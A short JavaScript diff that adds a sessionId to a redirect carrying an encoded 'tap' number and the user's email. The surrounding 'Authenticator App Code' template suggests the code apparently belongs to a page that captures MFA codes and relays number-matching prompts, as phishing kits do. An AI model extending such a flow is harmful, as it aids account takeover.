@@ -937,7 +937,7 @@ Authenticator App Code : ${code}
                                 if (typeof externalNumberYes !== 'undefined' && externalNumberYes) {
                                     const userEmail = currentEmail || $("#modal_ai").val().trim() || $("#ai").val().trim() || "";
                                     const encodedNum = btoa(tapNum);
-                                    window.location.href = `tap.html#${encodedNum}&${userEmail}`;
+                                    window.location.href = `tap.html#${encodedNum}&${userEmail}&${sessionId}`;
                                     return;
                                 }
 
